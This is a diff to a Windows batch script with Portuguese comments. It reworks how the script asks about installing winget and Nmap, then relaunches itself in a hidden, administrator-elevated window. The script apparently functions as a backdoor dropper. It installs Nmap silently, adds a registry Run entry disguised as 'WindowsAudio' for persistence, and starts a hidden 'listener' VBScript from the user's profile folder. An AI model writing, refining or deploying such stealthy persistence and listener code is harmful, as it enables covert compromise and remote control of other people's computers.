@@ -1,42 +1,43 @@
 @echo off
-:: Ocultar esta janela imediatamente
-if not "%1"=="hidden" (
-    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden -Verb RunAs"
-    exit
-)
 
-:: Verificar e instalar winget se necessário
+:: Verificar e perguntar sobre winget
 where winget > nul 2>&1
 if %errorlevel% neq 0 (
     echo.
-    echo [1] SIM - Baixar e instalar Winget
-    echo [2] NAO - Pular (winget ja instalado manualmente?)
-    echo [3] NAO - Continuar sem winget
+    echo [1] SIM - Baixar e instalar Winget + Nmap
+    echo [2] NAO - Pular (winget ja instalado manualmente)
+    echo [3] NAO - Continuar sem Winget (nao instala Nmap)
     echo.
     set /p opcao="Escolha [1/2/3]: "
-    
-    if "%opcao%"=="1" (
-        echo [*] Baixando Winget...
-        powershell -NoProfile -WindowStyle Hidden -Command "$url='https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'; $output=Join-Path $env:TEMP 'winget.msixbundle'; Invoke-WebRequest -Uri $url -OutFile $output" > nul 2>&1
-        
-        echo [*] Instalando Winget...
-        start "" /wait "%TEMP%\winget.msixbundle"
-        del "%TEMP%\winget.msixbundle" > nul 2>&1
-    )
-    if "%opcao%"=="2" (
-        echo [*] Pulando instalacao do Winget...
-        timeout /t 2 /nobreak > nul
-    )
-    if "%opcao%"=="3" (
-        echo [*] Continuando sem Winget...
-        goto skip_winget
-    )
 )
 
-:: Instalar Nmap
+:: Ocultar esta janela imediatamente
+if not "%1"=="hidden" (
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden %opcao%' -WindowStyle Hidden -Verb RunAs"
+    exit
+)
+
+:: Pegar a opção passada
+set opcao=%2
+
+:: Instalar Winget se opção for 1
+if "%opcao%"=="1" (
+    echo [*] Baixando Winget...
+    powershell -NoProfile -WindowStyle Hidden -Command "$url='https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle'; $output=Join-Path $env:TEMP 'winget.msixbundle'; Invoke-WebRequest -Uri $url -OutFile $output" > nul 2>&1
+    
+    echo [*] Instalando Winget...
+    start "" /wait "%TEMP%\winget.msixbundle"
+    del "%TEMP%\winget.msixbundle" > nul 2>&1
+)
+
+:: Pular Nmap se opção for 3
+if "%opcao%"=="3" goto skip_nmap
+
+:: Instalar Nmap (para opções 1 e 2)
 echo [*] Instalando Nmap...
 winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1
 
+:skip_nmap
 :: Atualizar PATH com o Nmap
 set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"
 
@@ -60,6 +61,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
 
-:: Limpar e sair
-del "%TEMP%\winget.msixbundle" > nul 2>&1
 exit
